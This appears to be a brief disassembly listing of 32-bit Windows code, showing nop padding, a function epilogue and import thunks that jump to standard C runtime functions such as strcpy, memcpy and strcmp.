retn
sub_1000d2d6
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
strcat
jmp [ strcat@IAT ]
memset
jmp [ memset@IAT ]
sub_1000d31a
add [ eax ] dl
memcpy
jmp [ memcpy@IAT ]
strlen
jmp [ strlen@IAT ]
strcpy
jmp [ strcpy@IAT ]
sub_1000d4ae
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
memcmp
jmp [ memcmp@IAT ]
_ftol
jmp [ _ftol@IAT ]
_abnormal_termination
jmp [ _abnormal_termination@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
_local_unwind2
jmp [ _local_unwind2@IAT ]
strcmp
jmp [ strcmp@IAT ]
_initterm
jmp [ _initterm@IAT ]
